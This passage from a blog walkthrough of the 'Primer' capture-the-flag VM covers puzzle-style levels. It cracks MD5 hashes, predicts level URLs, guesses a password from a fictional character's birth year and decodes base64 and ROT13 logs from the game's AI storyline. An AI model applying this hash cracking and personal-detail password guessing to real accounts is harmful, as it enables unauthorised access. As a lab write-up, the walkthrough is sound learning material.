class="p">(</span><span class="kd">var</span> <span class="nx">_0xf6a0x13</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">_0xf6a0x13</span><span class="o">&lt;</span><span class="nx">_0xf6a0x2</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">1</span><span class="p">]];</span><span class="nx">_0xf6a0x13</span><span class="o">++</span><span class="p">){</span><span class="nx">_0xf6a0x2</span><span class="p">[</span><span class="nx">_0xf6a0x13</span><span class="p">]</span><span class="o">=</span><span class="nx">rhex</span><span class="p">(</span><span class="nx">_0xf6a0x2</span><span class="p">[</span><span class="nx">_0xf6a0x13</span><span class="p">])};</span><span class="k">return</span> <span class="nx">_0xf6a0x2</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">6</span><span class="p">]](</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">0</span><span class="p">]);}</span><span class="kd">function</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">_0xf6a0xa</span><span class="p">){</span><span class="k">return</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">md51</span><span class="p">(</span><span class="nx">_0xf6a0xa</span><span class="p">))}</span><span class="kd">function</span> <span class="nx">add32</span><span class="p">(</span><span class="nx">_0xf6a0x4</span><span class="p">,</span><span class="nx">_0xf6a0x5</span><span class="p">){</span><span class="k">return</span> <span class="p">(</span><span class="nx">_0xf6a0x4</span><span class="o">+</span><span class="nx">_0xf6a0x5</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xFFFFFFFF</span><span class="p">}</span><span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">7</span><span class="p">])</span><span class="o">!=</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">8</span><span class="p">]){</span><span class="kd">function</span> <span class="nx">add32</span><span class="p">(</span><span class="nx">_0xf6a0x2</span><span class="p">,</span><span class="nx">_0xf6a0x1d</span><span class="p">){</span><span class="kd">var</span> <span class="nx">_0xf6a0x1e</span><span class="o">=</span><span class="p">(</span><span class="nx">_0xf6a0x2</span><span class="o">&amp;</span><span class="mh">0xFFFF</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="nx">_0xf6a0x1d</span><span class="o">&amp;</span><span class="mh">0xFFFF</span><span class="p">),</span><span class="nx">_0xf6a0x1f</span><span class="o">=</span><span class="p">(</span><span class="nx">_0xf6a0x2</span><span class="o">&gt;&gt;</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="nx">_0xf6a0x1d</span><span class="o">&gt;&gt;</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="nx">_0xf6a0x1e</span><span class="o">&gt;&gt;</span><span class="mi">16</span><span class="p">);</span><span class="k">return</span> <span class="p">(</span><span class="nx">_0xf6a0x1f</span><span class="o">&lt;&lt;</span><span class="mi">16</span><span class="p">)</span><span class="o">|</span><span class="p">(</span><span class="nx">_0xf6a0x1e</span><span class="o">&amp;</span><span class="mh">0xFFFF</span><span class="p">);}};</span><span class="kd">var</span> <span class="nx">X</span><span class="p">;</span><span class="kd">var</span> <span class="nx">L</span><span class="o">=</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">9</span><span class="p">];</span><span class="nx">X</span><span class="o">=</span><span class="nx">prompt</span><span class="p">(</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span><span class="nx">X</span><span class="o">=</span><span class="nx">md5</span><span class="p">(</span><span class="nx">X</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="nx">X</span><span class="o">===</span><span class="kc">null</span><span class="p">){</span><span class="nb">window</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">11</span><span class="p">]]</span><span class="o">=</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">12</span><span class="p">]};</span><span class="k">if</span><span class="p">(</span><span class="nx">X</span><span class="o">==</span><span class="nx">L</span><span class="p">){}</span><span class="k">else</span> <span class="p">{</span><span class="nb">window</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">11</span><span class="p">]]</span><span class="o">=</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">12</span><span class="p">]};</span><span class="kd">function</span> <span class="nx">ready</span><span class="p">(</span><span class="nx">_0xf6a0x23</span><span class="p">){</span><span class="k">if</span><span class="p">(</span><span class="nb">document</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">13</span><span class="p">]]</span><span class="o">!=</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">14</span><span class="p">]){</span><span class="nx">_0xf6a0x23</span><span class="p">()}</span><span class="k">else</span> <span class="p">{</span><span class="nb">document</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">16</span><span class="p">]](</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">15</span><span class="p">],</span><span class="nx">_0xf6a0x23</span><span class="p">)}}</span><span class="nx">ready</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span><span class="kd">var</span> <span class="nx">_0xf6a0x24</span><span class="o">=</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">17</span><span class="p">];</span><span class="nb">document</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">20</span><span class="p">]](</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">19</span><span class="p">])[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">18</span><span class="p">]]</span><span class="o">=</span><span class="nx">_0xf6a0x24</span><span class="p">;});</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="err">/SCRIPT&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now this is exactly the code that any sane person would like to read! Thankfully, you don&rsquo;t need to read it, although the comment sure is interesting! I printed the contents of the <code>_0x5cf4</code> variable and there was a lot to see, but I only show the important part:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[ '',
</span><span class='line'>  'length',
</span><span class='line'>  'substring',
</span><span class='line'>  'charCodeAt',
</span><span class='line'>  'split',
</span><span class='line'>  '0123456789abcdef',
</span><span class='line'>  'join',
</span><span class='line'>  'hello',
</span><span class='line'>  '5d41402abc4b2a76b9719d911017c592',
</span><span class='line'>  '0d28cba0bd4f26e16d766000d27e49fa',
</span><span class='line'>  '§#/$',
</span><span class='line'>  'location',
</span><span class='line'>  './_.php',
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>I cracked those MD5 hashes, first is <em>hello</em> and second is <em>GOD</em>&hellip;so let&rsquo;s say hello in the input box! I tried &ldquo;helloGOD&rdquo; but that just got me to another scary red page. Entering just &ldquo;GOD&rdquo; worked though!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level8b.png" title="primer level 8" alt="primer level 8"></p>

<p>If you glanced at the URL formats beginning at the second challenge, you probably noticed they begin with a number for the level, that keeps going up as you progress (1,2,3 etc.), an underscore, and then what looks like an MD5 hash! I copied all of them to an online cracking site, and here is the pattern:</p>

<p>1st node = 2</p>

<p>2nd = 3</p>

<p>3rd = 5</p>

<p>4th = 7</p>

<p>5th = 11</p>

<p>6th = 13</p>

<p>7th = 17</p>

<p>Following this, I surmised that the next one would be 19, because from the order it appears that next increase should be by 2. The order being: <code>1st to 2nd: +1 &ndash;> 2nd to 3rd: +2 &ndash;> 3rd to 4th: +2 &ndash;> 4th to 5th: +4 &ndash;> 5th to 6th: +2 &ndash;> 6th to 7th: +4</code>. So I constructed the URL for the next level with the hashed value of 19, like this: <code>8_1f0e3dad99908345f7439f8ffabdffc4/</code>.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level9.png" title="primer level 9" alt="primer level 9"></p>

<p>By now we know enough to click on the big EOF link :D</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_level10.png" title="primer level 10" alt="primer level 10"></p>

<p>What&rsquo;s this? It looks like a terminal prompt. I entered <em>whoami</em> in it:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_end.png" title="primer end" alt="primer complete"></p>

<p>Hmmm, scary :D I tried some other other commands too:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/primer_cli.png" title="primer cli" alt="primer cli"></p>

<p>There is a help command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>
</span><span class='line'>help
</span><span class='line'>[0]================================================================
</span><span class='line'> 
</span><span class='line'>ls [dir]
</span><span class='line'> 
</span><span class='line'>outputs contents of [dir]
</span><span class='line'>prints contents of current directory if no [dir] is specified
</span><span class='line'> 
</span><span class='line'>[1]================================================================
</span><span class='line'> 
</span><span class='line'>cd [dir]
</span><span class='line'> 
</span><span class='line'>changes the current directory to [dir]
</span><span class='line'>outputs current directory if no directory is specified
</span><span class='line'> 
</span><span class='line'>[2]================================================================
</span><span class='line'> 
</span><span class='line'>cat [file]
</span><span class='line'> 
</span><span class='line'>displays the content of [file]
</span><span class='line'> 
</span><span class='line'>[3]================================================================
</span><span class='line'> 
</span><span class='line'>ps
</span><span class='line'> 
</span><span class='line'>displays a list of running processes
</span><span class='line'> 
</span><span class='line'>[4]================================================================
</span><span class='line'> 
</span><span class='line'>whoami
</span><span class='line'> 
</span><span class='line'>displays username
</span><span class='line'> 
</span><span class='line'>[5]================================================================
</span><span class='line'> 
</span><span class='line'>clear
</span><span class='line'> 
</span><span class='line'>deletes terminal command history
</span><span class='line'> 
</span><span class='line'>[6]================================================================
</span><span class='line'> 
</span><span class='line'>connect [user]@[host]
</span><span class='line'> 
</span><span class='line'>connects to a remote host using the credentials of user
</span><span class='line'> 
</span><span class='line'>[7]================================================================
</span><span class='line'> 
</span><span class='line'>hash [type] [file|string]
</span><span class='line'> 
</span><span class='line'>prints the hash of a file or "string"
</span><span class='line'>supported hash functions are: 
</span><span class='line'>md5, sha256, sha1, whirlpool and crc32
</span><span class='line'> 
</span><span class='line'>[8]================================================================
</span><span class='line'> 
</span><span class='line'>encode|decode [type] [file|string]
</span><span class='line'> 
</span><span class='line'>encodes/decodes the file or "string"
</span><span class='line'>supported encodings are: 
</span><span class='line'>uu, gz, base64 and rot13
</span><span class='line'> 
</span><span class='line'>[9]================================================================
</span><span class='line'> 
</span><span class='line'>enrypt|decrypt [file|string] [key]
</span><span class='line'> 
</span><span class='line'>encrypts/decrypts the file or "string"</span></code></pre></td></tr></table></div></figure>


<p>Next I took a closer look at the AIs&hellip;I meant users! :D</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/chaos.png" title="chaos" alt="chaos"></p>

<p>I thought they were directories but couldn&rsquo;t cd to them. Then I tried cracking the names that look like long hashes of something, but no success. I looked at wintermute next:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/wintermute.png" title="wintermute" alt="wintermute"></p>

<p>Same thing, the hashes didn&rsquo;t yield anything. Next..</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/zephis.png" title="zephis" alt="zephis"></p>

<p>More hashes, more nothing.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/willis.png" title="willis" alt="willis"></p>

<p>Some text files! Let&rsquo;s read them!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat log_0001.txt
</span><span class='line'> 
</span><span class='line'>3rd of July 2028
</span><span class='line'>
</span><span class='line'>Working with Falken is amazing. He has a quick mind and is incredibly well informed on recent developements. I don't get why he left Sosu after setting up the Chaos c0re.
</span><span class='line'>They must have offered him a position.
</span><span class='line'>I'm not complaining here, just wondering because we are the only RnD team with unlimited funding and Falken was put in charge after all those years of absence.
</span><span class='line'>---
</span><span class='line'>cat log_0002.txt
</span><span class='line'> 
</span><span class='line'>8th of August 2028
</span><span class='line'>
</span><span class='line'>Falken didn't show up today. I'm a bit worried because he has been strange lately.
</span><span class='line'>According to the logs he's still logged in...
</span><span class='line'>I haven't informed the admins yet. I don't know why...
</span><span class='line'>---
</span><span class='line'>cat log_0003.txt
</span><span class='line'> 
</span><span class='line'>10th of August 2028
</span><span class='line'>
</span><span class='line'>The guys from the mainland called in today. Said some suits will be here tomorrow.
</span><span class='line'>Apparently the Erebus Core started behaving strangely and the kill-switch didn't fire.
</span><span class='line'>Chaos is still locked down. But I have a weird feeling about all this.
</span><span class='line'>Falken disappearing, the incident with Erebus...</span></code></pre></td></tr></table></div></figure>


<p>Some ominous stuff going down there! Let&rsquo;s check falken:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/falken.png" title="falken" alt="falken"></p>

<p>More logs!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat log_0001.txt
</span><span class='line'> 
</span><span class='line'>12th of Juli 2028
</span><span class='line'>
</span><span class='line'>My work on getting the old core up and running continues to spark doubt among my colleagues. To be fair, no-one has ever attempted to get a corrupted AI back online.
</span><span class='line'>But I am confident that I can isolate the malicious parts and rescue the data lost due the crash last year.
</span><span class='line'>---
</span><span class='line'>cat log_0002.txt
</span><span class='line'> 
</span><span class='line'>6th of August 2028
</span><span class='line'>
</span><span class='line'>I am getting nowhere fast. If we cannot make the recovery until the end of the month the project will be abandoned and the Sosu core locked down.
</span><span class='line'>A frozen BLOB, lost potential. I won't let that happen!
</span><span class='line'>Today was Joshua's birthday. 44 years, time flies. We spent some time in a bar in Shenzen and talked. A nice Father-Son-Momement. I've missed those.
</span><span class='line'>It took my mind of things but now that I'm here at the desk it all comes back.
</span><span class='line'>I might have to make a bold move...</span></code></pre></td></tr></table></div></figure>


<p>Well, clearly something went wrong. Restoring a corrupt AI doesn&rsquo;t sound like the best idea. I&rsquo;m getting more curious about this story! :D I checked the running processes next:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/ps.png" title="ps" alt="ps"></p>

<p>Trying anything with the <em>c0re</em> command gave me an access denied error, but the <em>connect</em> looks interesting! I tried it, but it asked for a password. Damn! At this point, I tried many passwords, trying to glue information from the logs and also tried the previously hinted passwords. It actually took me a long time to score the right one, I had overlooked an easy one! Most of my tries revolved around joshua and something else, but it took me a while to realize I can figure out Joshua&rsquo;s birth date because both his age and the year of the log are given. So 2028 &ndash; 44 = 1984! (no special significance for that, huh :D). So when I tried <code>joshua1984</code>, the screen changed..and we are on Erebus!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/erebus.png" title="erebus" alt="erebus"></p>

<p>The commands are the same as on the previous host, so let&rsquo;s check the users:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls /usr
</span><span class='line'>[wintermute] [mccarthy] [falken] </span></code></pre></td></tr></table></div></figure>


<p>More unintelligible hashes in wintermute, mccarthy looks empty, but Falken has left us more logs :D</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls falken
</span><span class='line'>log_0001._ log_0002._ log_0003._ log_0004._ 
</span><span class='line'>
</span><span class='line'>cat log_0001._
</span><span class='line'> 
</span><span class='line'>OXRoIG9mIEF1Z3VzdCAyMDI4CgpJIGhhdmUgam9pbmVkIHRoZSBuZXR3b3JrIGZyb20gaG9tZSBhbmQgY29ubmVjdGVkIHRvIHRoZSBFcmVidXMgc2VydmVyLiBJIHdpbGwgY29udGludWUgbXkgd29yayBmcm9tIGhlcmUgYnV0IEkgd2lsbCBoYXZlIHRvIGJlIG1vcmUgY2FyZWZ1bC4KTm93LCBFcmVidXMgd2FzIHRoZSBzZWNvbmQgQUkgaW5zdGFsbGVkIGFmdGVyIENoYW9zLiBJIHdhc24ndCBwYXJ0IG9mIHRoZSB0ZWFtIGJ1dCBtb3N0IG9mIHRoZSBtZW1iZXJzIHdlcmUgbXkgZnJpZW5kcywgc28gSSBrbm93IG15IHdheSBhcm91bmQgaGVyZS4K</span></code></pre></td></tr></table></div></figure>


<p>Uh-oh, this time it won&rsquo;t be so easy to read them. But it doesn&rsquo;t look as daunting as the ones I couldn&rsquo;t crack..sure enough, it turns out a base64 decode will do the trick! It was faster for me to feed the strings into an online decoder, but you can use the <em>decode</em> command on the server too. Here are the decoded logs:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>9th of August 2028 
</span><span class='line'>
</span><span class='line'>I have joined the network from home and connected to the Erebus server. I will continue my work from here but I will have to be more careful. Now, Erebus was the second AI installed after Chaos. I wasn't part of the team but most of the members were my friends, so I know my way around here. 
</span><span class='line'>
</span><span class='line'>10th of August 2028 
</span><span class='line'>
</span><span class='line'>Ok, the problem I have with the Chaos c0re is that it's source is shifting too fast. Every time I execute a small part it breaks down or begins to morph and grow in order to replicate functions of different parts. The signaling is also going crazy even on segments that are relatively stable. Signaling to disconnected parts! And reactions to responses that would have but definitely have not been sent... Am I going crazy or is Chaos experiencing phantom pain?</span></code></pre></td></tr></table></div></figure>


<p>Trying to read the 3rd and 4th logs kicked me out of the terminal or something..after reconnecting, I looked at the running processes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ps
</span><span class='line'>USER     PID    CPU    MEM   COMMAND
</span><span class='line'>root     3251   5.2    3.9    connect falken@TrivialZ3r0
</span><span class='line'>root     2677   33.8   43.8   c0re -t Erebus
</span><span class='line'>nieve    84687  0.8    0.5    ps</span></code></pre></td></tr></table></div></figure>


<p>Cool, let&rsquo;s follow in Falken&rsquo;s footsteps..uhm, connects. I tried, but the password I had wasn&rsquo;t good! After more password guessing, I figured something suspicious is preventing me from reading the last logs. Also, all those decoding commands on the server must have been given for a reason! It&rsquo;s funny, but if I had just used them from the beginning instead of going to external sites, I might have progressed faster. Anyway, only after I verified that I could read the first 2 logs with the <em>decode</em> command, instead of pasting the strings inside to an online decoder, I thought I should try using it for the remaining logs as well. I cycled through the options until the one that hit the jackpot!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>decode gz log_0003._
</span><span class='line'> 
</span><span class='line'>12th of August 2028
</span><span class='line'>
</span><span class='line'>I think they might be on to me and I can only change the encoding so often.
</span><span class='line'>I will have to do something reckless... but not from here, they are already too close</span></code></pre></td></tr></table></div></figure>


<p>So it&rsquo;s Falken messing around that is hindering us..but it seems someone else is after him as well? I tried the same thing with the last log:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>decode gz log_0004._
</span><span class='line'> 
</span><span class='line'>PCH ybnq vapernfrq abgvprnoyl, fbzrguvat vf tbvat gb unccra naq V jvyy abg or nebhaq gb jvgarff... GevivnyM3e0 frrzf gb or dhvrg, qba'g xabj jung'f tbvat ba bire gurer ohg vg pna'g or jbefr guna orvat genprq qbja ol znvaynaq fcbbxf. Svefg V arrq fbzr perqf, gubhtu. Uzz, GevivnyM3e0... gung erzvaqf zr bs fbzrbar, yrg'f whfg ubcr gubfr thlf nera'g zngu trrxf.</span></code></pre></td></tr></table></div></figure>


<p>That looks like ROT13 to me, and thankfully, we can decode it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>decode rot13 "PCH ybnq vapernfrq abgvprnoyl, fbzrguvat vf tbvat gb unccra naq V jvyy abg or nebhaq gb jvgarff... GevivnyM3e0 frrzf gb or dhvrg, qba'g xabj jung'f tbvat ba bire gurer ohg vg pna'g or jbefr guna orvat genprq qbja ol znvaynaq fcbbxf. Svefg V arrq fbzr perqf, gubhtu. Uzz, GevivnyM3e0... gung erzvaqf zr bs fbzrbar, yrg'f whfg ubcr gubfr thlf nera'g zngu trrxf."
</span><span class='line'> 
</span><span class='line'>CPU load increased noticeably, something is going to happen and I will not be around to witness... TrivialZ3r0 seems to be quiet, don't know what's going on over there but it can't be worse than being traced down by mainland spooks. First I need some creds, though. Hmm, TrivialZ3r0... that reminds me of someone, let's just hope those guys aren't math geeks.</span></code></pre></td></tr></table></div></figure>


<p>I followed the hint that Falken left us and googled for &ldquo;trivial zero&rdquo;. This returned info about a Riemann zeta function and I stopped reading after that because..well, it look complicated, and I thought I already had a good candidate for the password :D I tried connecting again, this time gave <em>Riemann</em> as password..new host, new things to do!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/trivialzero.png" title="TrivialZ3r0" alt="trivialzero"></p>

<p>This one is a bit different, instead of a user folder, there is a password folder:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls /passwd
</span><span class='line'>falken chaos mccarthy 
</span><span class='line'>
</span><span class='line'>cat falken
</span><span class='line'> 
</span><span class='line'>61ea1974dd974297913b1fa2f0470d26
</span><span class='line'> 
</span><span class='line'>cat chaos
</span><span class='line'> 
</span><span class='line'>85241de03d1254ac40274b02caafcd99
</span><span class='line'> 
</span><span class='line'>cat mccarthy
</span><span class='line'> 
</span><span class='line'>f74bfa0e35e5089a0bb743a893b4c7e3</span></code></pre></td></tr></table></div></figure>


<p>All right, let&rsquo;s get cracking! In the meantime, I looked for where to next:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ps
</span><span class='line'>USER     PID    CPU    MEM   COMMAND
</span><span class='line'>root     3251   4.5    2.9    connect chaos@Wintermute
</span><span class='line'>falken   2005   75.3   73.6   c0re -t Chaos
</span><span class='line'>root     2677   87.1   43.2   c0re -t TrivialZ3r0
</span><span class='line'>nieve    26588  0.5    0.5    ps</span></code></pre></td></tr></table></div></figure>


<p>So it seems we will have to connect as chaos for the next one. I went to <a href="https://hashkiller.co.uk/md5-decrypter.aspx">HashKiller</a> and cracked the hashes as follows: <em>Falken</em>&ndash;<em>Riemann</em> (we already know), <em>Chaos</em>&ndash;<em>2.718281828459045</em> (wouldn&rsquo;t have guessed this one! If you are curious, this is a mathematical constant known as Euler&rsquo;s Number). Couldn&rsquo;t crack McCarthy&rsquo;s. But we have enough to pay Wintermute a visit:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/wintermute_connected.png" title="Wintermute" alt="Wintermute"></p>

<p>Uhm, there are no more breadcrumbs to follow..and why is there a file called nieve in here? Uh-oh..</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/end.png" title="nieve" alt="the end"></p>

<p>An invitation from the AIs! Much better than a squad of hired assassins that would erase all the tracks of this unfortunate hacker..well then, let&rsquo;s see what awaits on the other side!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/primer/credits.png" title="credits" alt="credits"></p>

<p>This was such a great VM, one of my favorites! It required less technical know-how and more detective thinking (or story immersion). I highly recommend it, great storyline and atmosphere! Many thanks to Arne Rick for this unconventional challenge!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ Don't hate yourself in the morning -- \
</span><span class='line'>\ sleep till noon.                      /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - pWnOS]]></title>
    <link href="http://chousensha.github.io/blog/2016/02/15/pentest-lab-pwnos/"/>
    <updated>2016-02-15T07:08:57-05:00</updated>
    <id>http://chousensha.github.io/blog/2016/02/15/pentest-lab-pwnos</id>
